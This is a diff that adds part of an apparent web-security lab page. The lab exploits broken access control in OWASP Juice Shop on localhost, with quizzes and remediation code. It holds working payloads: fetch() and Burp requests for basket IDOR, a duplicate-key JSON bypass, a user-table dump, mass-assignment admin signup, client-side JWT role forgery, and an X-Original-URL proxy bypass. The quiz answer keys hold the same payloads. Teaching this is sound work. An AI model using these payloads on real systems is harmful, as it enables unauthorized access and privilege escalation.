+          <div class="terminal-window" style="margin:0 0 var(--space-2);">
+            <div class="terminal-window__header"><span class="terminal-window__title">1. Run in DevTools Console (your JWT's BasketId first, victim Basket 2 second)</span></div>
+            <div class="terminal-window__body"><pre><code>fetch('/api/BasketItems', {method:'POST', headers:{'Content-Type':'application/json', Authorization:'Bearer '+localStorage.token}, body:'{"BasketId":3,"ProductId":6,"BasketId":2,"quantity":1}'}).then(r=&gt;r.json()).then(console.log)</code></pre></div>
+          </div>
+          <div class="terminal-window" data-no-copy style="margin:0 0 var(--space-2);">
+            <div class="terminal-window__header"><span class="terminal-window__title">2. Or send in Burp Repeater (replace 3 with your own BasketId if not logged in as Bender)</span></div>
+            <div class="terminal-window__body"><pre><code>POST /api/BasketItems HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJ0eXAiOiJKV1Qi...
+Content-Type: application/json
+
+{"BasketId":3,"ProductId":6,"BasketId":2,"quantity":1}
+
+HTTP/1.1 200 OK
+{"status":"success","data":{"id":9,"ProductId":6,"BasketId":2,"quantity":1}}</code></pre></div>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:0;">
+            Verify your item landed inside Jim's cart by running <code>fetch('/rest/basket/2', {headers:{Authorization:'Bearer '+localStorage.token}}).then(r=&gt;r.json()).then(console.log)</code>. When a guard and a database parser read different copies of the same key, you own the gap between them.
+          </p>
+        </div>
+      </section>
+
+      <!-- Section 4: Vertical Escalation (JS Bundle Recon -> BOLA User Dump -> Mass Assignment to Admin) -->
+      <section>
+        <h2 id="vertical-escalation">4. Vertical Escalation: Recon Hidden APIs, Dump All Users &amp; Become Admin</h2>
+        <p class="lab-lead">
+          Reading and modifying other customers' baskets is <strong>horizontal</strong>. Now we go <strong>vertical</strong>: we will extract Juice Shop's hidden endpoints straight out of its downloaded JavaScript bundle, call an administrative endpoint that the UI hid from us to dump all 23+ users, and then use a hidden field from that response to register a brand-new <code>admin</code> account.
+        </p>
+
+        <div class="comparison-grid" style="margin-bottom:var(--space-4);">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Frontend UI Guard (<code>AdminGuard</code>)</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">blocks /#/administration</span>
+            </div>
+            <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
+              <div class="terminal-window__body"><pre><code>// Angular checks your role in the browser:
+canActivate() {
+  const token = this.loginGuard.tokenDecode();
+  return token?.data?.role === 'admin'
+    ? true : this.forbidRoute(); // → 403 page
+}</code></pre></div>
+            </div>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
+              If you type <code>http://localhost:3000/#/administration</code> in the address bar as a customer, Angular checks your JWT role in the browser and redirects you to a red <code>403 Access Denied</code> screen.
+            </p>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Backend API Route (<code>server.js</code>)</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">no role check!</span>
+            </div>
+            <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
+              <div class="terminal-window__body"><pre><code>// Backend route in server.js:
+app.get('/api/Users', security.isAuthorized());
+// Only checks that you have a valid login token.
+// NEVER checks role === 'admin'!</code></pre></div>
+            </div>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
+              The developer locked the JavaScript UI page, but forgot to enforce the role check on the backend REST API that actually serves the user table!
+            </p>
+          </div>
+        </div>
+
+        <div class="bento-card" style="margin-top:var(--space-3);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 3 · Mine main.js for Hidden Endpoints, Then Dump Every User &amp; Schema Field</strong>
+            <span class="comparison-badge" style="color:var(--color-accent);">Recon → Vertical BOLA</span>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0;display:flex;flex-direction:column;gap:var(--space-2);">
+            <li><strong>Step 3a (Acquire the hidden endpoints)</strong>: How do we know what API endpoints exist without guessing? Run this one-liner in your DevTools Console (<kbd>F12</kbd>) to scan Angular's downloaded <code>/main.js</code> bundle for every <code>/api/...</code> and <code>/rest/...</code> path:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">DevTools Console · extract all 35 REST endpoints from main.js</span></div>
+                <div class="terminal-window__body"><pre><code>fetch('/main.js').then(r=&gt;r.text()).then(t=&gt;console.log([...new Set(t.match(/\/(api|rest)\/[A-Za-z0-9_-]+/g))].sort()))</code></pre></div>
+              </div>
+            </li>
+            <li>Look at the array printed in your Console: right alongside <code>/api/BasketItems</code> and <code>/api/Products</code> sits <strong><code>/api/Users</code></strong> (which you also see as <code>POST /api/Users</code> whenever someone registers on <code>/#/register</code>).</li>
+            <li><strong>Step 3b (Bypass the UI Guard &amp; Dump the Table)</strong>: Still logged in as a normal customer, call <code>GET /api/Users</code> directly so the request skips Angular's <code>AdminGuard</code> and goes straight to Express:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">DevTools Console · dump /api/Users as an interactive table</span></div>
+                <div class="terminal-window__body"><pre><code>fetch('/api/Users', {headers:{Authorization:'Bearer '+localStorage.token}}).then(r=&gt;r.json()).then(d=&gt;console.table(d.data, ['id','email','role']))</code></pre></div>
+              </div>
+            </li>
+            <li><strong>Spot the clue for Step 4</strong>: Look at the columns returned by <code>GET /api/Users</code>. Every user record has an explicit <strong><code>role</code></strong> property, and User <code>id: 1</code> (<code>admin@juice-sh.op</code>) has <strong><code>"role": "admin"</code></strong>!</li>
+          </ol>
+          <details class="thought-accordion" style="margin-top:var(--space-3);">
+            <summary>Want to see the hidden frontend routes (like /#/administration) inside main.js too?</summary>
+            <div class="thought-accordion__content">
+              <p style="margin:0 0 var(--space-2);">Run this one-liner in the Console to list every route path defined in Angular's router table:</p>
+              <div class="terminal-window" style="margin:0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">DevTools Console · extract hidden Angular route paths</span></div>
+                <div class="terminal-window__body"><pre><code>fetch('/main.js').then(r=&gt;r.text()).then(t=&gt;console.log([...new Set(t.match(/path:`[a-z0-9-]+`/g))]))</code></pre></div>
+              </div>
+            </div>
+          </details>
+        </div>
+
+        <div class="bento-card" style="margin-top:var(--space-4);border-left:3px solid var(--color-cyan);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-cyan);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 4 · Mirror "role": "admin" into POST /api/Users (Mass Assignment / BOPLA)</strong>
+            <span class="comparison-badge" style="color:var(--color-cyan);">Admin Takeover</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+            <strong>How Step 3 feeds Step 4</strong>: When a normal visitor registers on <code>/#/register</code>, the Angular form sends <code>POST /api/Users</code> with only <code>email</code> and <code>password</code>. It never sends <code>role</code>, so the database defaults new accounts to <code>"customer"</code>. But in Step 3, <code>GET /api/Users</code> just showed us that the database column is named <code>"role"</code> and accepts <code>"admin"</code>! Because the backend passes the entire JSON body straight into Sequelize's <code>User.create(req.body)</code> without stripping privileged fields (<strong>Mass Assignment</strong>), watch what happens when we mirror <code>"role": "admin"</code> into a signup request:
+          </p>
+          <div class="terminal-window" style="margin:0 0 var(--space-2);">
+            <div class="terminal-window__header"><span class="terminal-window__title">1. Run in DevTools Console (or send via Burp Repeater) to register an Admin</span></div>
+            <div class="terminal-window__body"><pre><code>fetch('/api/Users', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({email:'pentester@juice-sh.op',password:'Password123',passwordRepeat:'Password123',role:'admin'})}).then(r=&gt;r.json()).then(console.log)</code></pre></div>
+          </div>
+          <div class="terminal-window" data-no-copy style="margin:0 0 var(--space-2);">
+            <div class="terminal-window__header"><span class="terminal-window__title">2. Server Response · 201 Created with role: "admin"</span></div>
+            <div class="terminal-window__body"><pre><code>HTTP/1.1 201 Created
+{"status":"success","data":{
+  "id": 24,
+  "email": "pentester@juice-sh.op",
+  "role": "admin",
+  "profileImage": "/assets/public/images/uploads/defaultAdmin.png",
+  "isActive": true
+}}</code></pre></div>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:0;">
+            Now log in at <code>http://localhost:3000/#/login</code> as <code>pentester@juice-sh.op</code> with password <code>Password123</code>, then open <code>http://localhost:3000/#/administration</code>. Because the server signed a real JWT with <code>"role": "admin"</code>, the full Administration dashboard opens right up!
+          </p>
+        </div>
+      </section>
+
+      <!-- Section 5: Under-the-Hood Parser Hacks, Modern 2020s Traps & PortSwigger Ladder -->
+      <section>
+        <h2 id="portswigger-ladder">5. Parser Disagreements, Modern 2020s API Traps &amp; PortSwigger Labs</h2>
+        <p class="lab-lead">
+          In real assessments, developers put reverse proxies, route guards, or UUIDs in front of sensitive endpoints. Here is how pentesters bypass them when two layers of the stack disagree.
+        </p>
+
+        <h3 id="parser-hacks">Think you know JSON &amp; HTTP? Three parser tricks that bypass access-control guards</h3>
+        <p class="lab-lead">
+          Access-control bypasses frequently exploit a disagreement between the layer that <strong>checks</strong> the request and the layer that <strong>executes</strong> it:
+        </p>
+
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>⚡ UNDER-THE-HOOD PARSER HACKS · when validation and execution disagree</span>
+            <span style="color:var(--color-accent);">JSON + HTTP quirks</span>
+          </div>
+          <div class="table-container">
+            <table class="data-table">
+              <thead>
+                <tr>
+                  <th>What the Guard Blocks</th>
+                  <th>The Parser Trick</th>
+                  <th>Working Payload</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><strong>Foreign <code>BasketId</code> in JSON</strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Checks <code>basketIds[0] === user.bid</code></span></td>
+                  <td>The JSON spec (RFC 8259) permits duplicate keys! A first-match validator reads the <strong>1st key</strong>, while standard <code>JSON.parse()</code> and Juice Shop's DB writer overwrite it with the <strong>last key</strong>.</td>
+                  <td><code>{"BasketId":3,"ProductId":6,"BasketId":2,"quantity":1}</code></td>
+                </tr>
+                <tr>
+                  <td><strong>Front-End Proxy Blocks <code>/admin</code></strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Reverse proxy returns <code>403</code> on <code>/admin</code></span></td>
+                  <td>Send <code>GET /</code> so the front-end proxy allows the request through, and add an <code>X-Original-URL</code> (or <code>X-Rewrite-URL</code>) header that the back-end framework uses to override the target path!</td>
+                  <td><code>GET /?username=carlos HTTP/1.1</code><br /><code>X-Original-URL: /admin/delete</code></td>
+                </tr>
+                <tr>
+                  <td><strong>UI Hides Privileged Fields</strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Signup form only has email &amp; password</span></td>
+                  <td>Mirror column names discovered in <code>GET</code> responses into <code>POST</code>/<code>PUT</code> bodies. ORMs like Sequelize, Prisma, and Mongoose bind every matching key in <code>req.body</code> unless filtered (<strong>Mass Assignment / BOPLA</strong>).</td>
+                  <td><code>{"email":"a@b.op","password":"p","role":"admin"}</code></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <h3 id="modern-traps" style="margin-top:var(--space-4);">Why "Client-Side Router Guards" and "Switching to UUIDs" Still Fail (Modern 2020s Traps)</h3>
+        <p class="lab-lead">
+          Two mistakes show up constantly in modern React/Angular SPAs and REST/GraphQL APIs:
+        </p>
+
+        <div class="comparison-grid" style="margin-bottom:var(--space-4);">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Trap 1: Client-Side JWT Role Check</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">no signature check in JS</span>
+            </div>
+            <div class="terminal-window" style="margin:var(--space-2) 0;">
+              <div class="terminal-window__header"><span class="terminal-window__title">Run in Console as a customer, then open /#/administration</span></div>
+              <div class="terminal-window__body"><pre><code>localStorage.token = localStorage.token.replace(
+  /\.([^.]+)\./,
+  (_, p) =&gt; '.' + btoa(atob(p).replace('"customer"', '"admin"')) + '.'
+)</code></pre></div>
+            </div>
+            <ul class="comparison-list" style="margin-top:var(--space-2);">
+              <li><span class="comparison-icon">🎭</span> Angular's <code>AdminGuard</code> decodes <code>localStorage.token</code> with <code>jwt-decode</code> in the browser (which <strong>never verifies the RSA signature</strong>!).</li>
+              <li><span class="comparison-icon">🚪</span> Rewriting <code>"customer"</code> to <code>"admin"</code> in the Base64 payload tricks the Angular router into opening <code>/#/administration</code> immediately!</li>
+            </ul>
+          </div>
+
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Trap 2: "UUIDs Fix IDOR" Myth</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">obscurity ≠ authz</span>
+            </div>
+            <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
+              <div class="terminal-window__body"><pre><code>// Replacing 1, 2, 3 with UUIDs:
+GET /rest/basket/a8f9c2d1-4b3e-411a-9c0e-7f2b1d8a3c4e
+// Still vulnerable if the query has no UserId check!</code></pre></div>
+            </div>
+            <ul class="comparison-list" style="margin-top:var(--space-2);">
+              <li><span class="comparison-icon">🔍</span> Developers often swap sequential numbers for random UUIDs instead of adding an ownership check in the database query.</li>
+              <li><span class="comparison-icon">📡</span> Public endpoints (product reviews, leaderboards, <code>/api/Users</code>, error logs) routinely leak user UUIDs. Once you copy a victim's UUID, the missing ownership check still hands over their data!</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="prediction-prompt" style="margin-bottom:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 In PortSwigger Lab #4 below, the front-end reverse proxy blocks any request whose URL path starts with <code>/admin</code>. However, the back-end server honors the <code>X-Original-URL</code> header. To delete user <code>carlos</code> (normally <code>GET /admin/delete?username=carlos</code>), what do you put on the <code>GET</code> request line, and what do you put in <code>X-Original-URL</code>?</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">Put the query parameter on a harmless root path (<code>GET /?username=carlos HTTP/1.1</code>) so the front-end proxy sees <code>/</code> and lets it through, and add the header <code>X-Original-URL: /admin/delete</code> so the back-end routes the request to <code>/admin/delete</code> with <code>username=carlos</code>!</p>
+          </div>
+        </div>
+
+        <div class="target-launcher target-launcher--hosted" data-target-slug="portswigger">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🎓</span>
+              <div>
+                <h3 class="target-launcher__title">PortSwigger Web Security Academy · Four Live Targets</h3>
+                <div class="target-launcher__platform">Practice forced browsing, horizontal IDOR, cookie role tampering, and X-Original-URL bypass</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🌐 Hands-On Practice</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">Run these four labs in order</span>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality" target="_blank" rel="noopener noreferrer">1. [Apprentice] Unprotected admin functionality (discover hidden admin path in /robots.txt)</a>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter" target="_blank" rel="noopener noreferrer" style="margin-top:6px;">2. [Apprentice] User ID controlled by request parameter (horizontal IDOR on ?id=carlos)</a>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter" target="_blank" rel="noopener noreferrer" style="margin-top:6px;">3. [Apprentice] User role controlled by request parameter (flip Admin=false cookie to Admin=true)</a>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented" target="_blank" rel="noopener noreferrer" style="margin-top:6px;">4. [Practitioner] URL-based access control can be circumvented (X-Original-URL header bypass)</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Sign in at <code>portswigger.net</code> → click <strong>Access the lab</strong></span>
+            <a class="target-launcher__catalog-link" href="../tools.html#portswigger">→ platform card</a>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 6: Write the Finding & How Developers Fix It -->
+      <section>
+        <h2 id="write-finding">6. Write the Finding &amp; How Developers Fix It</h2>
+        <p class="lab-lead">
+          Here is how you document today's Juice Shop access-control vulnerabilities in a professional pentest report, followed by the exact server-side fix.
+        </p>
+
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>📓 FINDING · Broken Object &amp; Function Level Authorization Across REST API</span>
+            <span style="color:var(--color-danger);">Severity: High (CVSS 8.1)</span>
+          </div>
+          <div class="table-container">
+            <table class="data-table">
+              <tbody>
+                <tr><td style="white-space:nowrap;"><strong>Title</strong></td><td>Broken Access Control: Horizontal Basket IDOR, HPP Write Bypass, Unprotected User Listing, and Admin Mass Assignment</td></tr>
+                <tr><td><strong>Severity</strong></td><td>High · <code>CVSS 8.1</code> (any user can read/write foreign baskets, dump all accounts, or self-assign the <code>admin</code> role)</td></tr>
+                <tr><td><strong>Affected endpoints</strong></td><td><code>GET /rest/basket/:id</code>, <code>POST /api/BasketItems</code>, <code>GET /api/Users</code>, <code>POST /api/Users</code></td></tr>
+                <tr><td><strong>Steps to reproduce</strong></td><td>1. Authenticate as a customer and send <code>GET /rest/basket/1</code> → returns Admin's basket.<br />2. Send <code>POST /api/BasketItems</code> with duplicate <code>{"BasketId":3,"ProductId":6,"BasketId":2,"quantity":1}</code> → writes item into Victim Basket 2.<br />3. Extract <code>/api/Users</code> from <code>main.js</code> and send <code>GET /api/Users</code> → returns all user accounts and schema fields (<code>role</code>).<br />4. Mirror <code>"role":"admin"</code> into <code>POST /api/Users</code> → creates a full Administrator account.</td></tr>
+                <tr><td><strong>Impact</strong></td><td>Complete compromise of customer privacy, cart integrity, and administrative access across the application without requiring prior credentials or complex exploit chains.</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>1. Scope all basket queries to the authenticated user ID inside the verified session token (<code>WHERE UserId = req.user.id</code>).<br />2. Enforce server-side role middleware (<code>req.user.role === 'admin'</code>) on administrative endpoints.<br />3. Explicitly allowlist registration fields (<code>{ email, password }</code>) and parse JSON once so validation and database layers read the exact same object.</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <h3 id="the-fix" style="margin-top:var(--space-4);">Why the bug existed in Juice Shop's source code</h3>
+        <div class="comparison-grid" style="margin-top:var(--space-2);">
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">💥 Vulnerable Code (<code>routes/basket.js</code>)</h3>
+              <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.4);">trusts URL parameter</span>
+            </div>
+            <div class="terminal-window" data-no-copy style="margin:0;">
+              <div class="terminal-window__body"><pre><code>// Fetches whichever id the client asked for in the URL:
+const id = req.params.id;
+const basket = await BasketModel.findOne({
+  where: { id },
+  include: [{ model: ProductModel, as: 'Products' }]
+});
+res.json(utils.queryResultToJson(basket));</code></pre></div>
+            </div>
+          </div>
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">✅ Secure Code</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);border-color:rgba(0,229,255,0.4);">scoped to JWT session</span>
+            </div>
+            <div class="terminal-window" data-no-copy style="margin:0;">
+              <div class="terminal-window__body"><pre><code>// Enforces ownership using the verified JWT user ID:
+const id = req.params.id;
+const basket = await BasketModel.findOne({
+  where: { id, UserId: req.user.data.id },
+  include: [{ model: ProductModel, as: 'Products' }]
+});
+if (!basket) return res.status(403).json({ error: 'Forbidden' });</code></pre></div>
+            </div>
+          </div>
+        </div>
+        <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin-top:var(--space-2);">
+          Notice that adding <code>UserId: req.user.data.id</code> to the <code>WHERE</code> clause kills IDOR completely: if User #3 asks for Basket #1, the database looks for a basket where <code>id = 1 AND UserId = 3</code>, finds nothing, and returns <code>403 Forbidden</code>.
+        </p>
+      </section>
+
+      <!-- Section 7: Quiz -->
+      <section class="quiz-section">
+        <div class="quiz-section__header">
+          <h2 class="quiz-section__title" id="self-assessment">7. Quick Check</h2>
+        </div>
+        <p class="lab-lead">Test your understanding of today's discovery mindset and attacks before wrapping up.</p>
+
+        <div class="quiz-card" data-question-id="lab05-q1">
+          <div class="quiz-question">Q1: What is the difference between Authentication and Authorization?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Backwards. Authentication proves who you are; Authorization checks what you're allowed to access.">A) Authentication checks which objects you can access; Authorization proves who you are.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Spot on. Authentication verifies your identity (login/JWT signature), while Authorization verifies whether that identity is allowed to access a specific resource or action.">B) Authentication proves who you are; Authorization checks whether you are allowed to access a specific resource or action.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="They are two distinct checks. Juice Shop verified your JWT signature (Authentication) while completely skipping the ownership check (Authorization).">C) They are two words for the exact same check.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab05-q2">
+          <div class="quiz-question">Q2: Logged in as a normal customer, the UI shows no link to <code>/api/Users</code> and the signup form shows no <code>role</code> input. How did we discover both without blind guessing?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Exactly. Mining `main.js` (or flipping `POST /api/Users` from signup to `GET /api/Users`) revealed the endpoint, and inspecting the JSON records returned by `GET /api/Users` revealed the exact `'role': 'admin'` property to mirror into `POST /api/Users`.">A) By mining the downloaded `main.js` bundle (or flipping `POST /api/Users` from signup to `GET`), and then reading the `"role": "admin"` field from the `GET /api/Users` response.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Cracking the server's RSA key is infeasible and unnecessary; the frontend bundle and REST responses leak the endpoints and schema directly.">B) By cracking the server's RSA private key to decrypt the database schema.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Port scanning only reveals open TCP ports (like 3000), never HTTP routes or JSON column names.">C) By running an Nmap SYN scan against port 3000.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab05-q3">
+          <div class="quiz-question">Q3: Navigating to <code>/#/administration</code> in your browser as a customer showed a <code>403 Access Denied</code> screen, yet calling <code>GET /api/Users</code> returned every user account. Why?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Your token was still a normal customer token (`role: customer`). The backend endpoint simply never checked the role field.">A) Burp Suite automatically upgrades customer tokens to admin tokens.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. Angular's AdminGuard blocked the UI route in the browser, but the backend `/api/Users` route only checked that you were logged in (`isAuthorized`), never that `role === 'admin'`.">B) The role check was only enforced in the client-side Angular router, not on the backend `/api/Users` endpoint.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="HTTPS encrypts traffic on the wire; it has nothing to do with whether an endpoint checks your role.">C) Because `localhost:3000` uses HTTP instead of HTTPS.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab05-q4">
+          <div class="quiz-question">Q4: Why did sending <code>{"BasketId":3,"ProductId":6,"BasketId":2,"quantity":1}</code> bypass the <code>401 Invalid BasketId</code> check on <code>POST /api/BasketItems</code>?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Only one request was sent, so there was no race condition or timing window.">A) It triggered a race condition by overloading the database.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Exactly. HTTP Parameter Pollution (JSON key collision): the security check inspected `basketIds[0]` (your own basket `3`), while the database insert used `basketIds[basketIds.length - 1]` (victim basket `2`).">B) HTTP Parameter Pollution: the ownership check read the first `BasketId` (`3`), while the database layer wrote the last `BasketId` (`2`).</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Adding a second `BasketId` didn't modify your JWT signature; it exploited a disagreement between validation and persistence.">C) Duplicate keys disable JWT signature verification in Express.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab05-q5">
+          <div class="quiz-question">Q5: What is the root-cause server-side fix for the basket IDOR vulnerability?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Replacing sequential numbers with UUIDs makes IDs harder to guess, but if a UUID leaks in another API response or log, the missing ownership check still hands over the record.">A) Replace sequential basket numbers (`1, 2, 3`) with random UUIDs.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Spot on. Always scope database queries to the authenticated user ID from the verified session token (`WHERE id = :id AND UserId = req.user.data.id`), or load the basket directly by `req.user.data.id`.">B) Scope the database query to the authenticated user's ID from the verified session token (`WHERE UserId = req.user.data.id`).</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Hiding `sessionStorage.bid` in the frontend doesn't stop an attacker from sending `GET /rest/basket/1` directly in Burp Repeater or `fetch()`.">C) Encrypt `sessionStorage.bid` in the Angular frontend.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab05-q6"
+          data-expected-regex="/(rest/basket|api/Users)/|basket/[0-9]|Users/[0-9]|/api/Users\b"
+          data-solution-rationale="Any authenticated GET request to another user's basket (e.g. GET /rest/basket/1) or the unprotected user list (GET /api/Users) demonstrates broken access control with zero special characters."
+          data-hint="Write the HTTP method and path you sent in Step 1 or Step 3, e.g. GET /rest/basket/1 or GET /api/Users.">
+          <div class="quiz-question">Q6 [Request]: Write one HTTP request line (method + path) that a logged-in customer can send to read another user's basket or dump the user table.</div>
+          <div class="quiz-input-group">
+            <input type="text" class="quiz-input" placeholder="GET /rest/basket/..." spellcheck="false" autocomplete="off" />
+            <button type="button" class="quiz-submit-btn">Execute</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab05-q7"
+          data-expected-regex='(\{[^}]*"BasketId"\s*:\s*3[^}]*"BasketId"\s*:\s*[12][^}]*\}|\{[^}]*"role"\s*:\s*"admin"[^}]*\})'
+          data-solution-rationale='Clean bypass! Either duplicating "BasketId" ({"BasketId":3,"ProductId":6,"BasketId":2,"quantity":1}) so validation checks the first key and the DB writes the second, or injecting "role":"admin" into POST /api/Users via Mass Assignment, escalates your access.'
+          data-hint='Write a JSON object that either sends "BasketId" twice ({"BasketId":3,"ProductId":6,"BasketId":2,"quantity":1}) or injects the admin role property ({"email":"a@b.op","password":"p","role":"admin"}).'>
+          <div class="quiz-question">Q7 [Bypass Challenge]: Write a JSON body that either bypasses the <code>POST /api/BasketItems</code> write guard (assuming your own basket is <code>3</code> and the victim's is <code>1</code> or <code>2</code>) <strong>OR</strong> escalates a <code>POST /api/Users</code> registration to <code>admin</code>.</div>
+          <div class="quiz-input-group">
+            <input type="text" class="quiz-input" placeholder='{"BasketId":3, ...}' spellcheck="false" autocomplete="off" />
+            <button type="button" class="quiz-submit-btn">Execute</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <div data-site-footer></div>
+
+  <script data-site-root=".." src="../assets/js/site.js"></script>
+  <script src="../assets/js/vendor/qrcode.js"></script>
+  <script src="../assets/js/lab-common.js"></script>
+  <script src="../assets/js/quiz.js"></script>
+</body>
+</html>
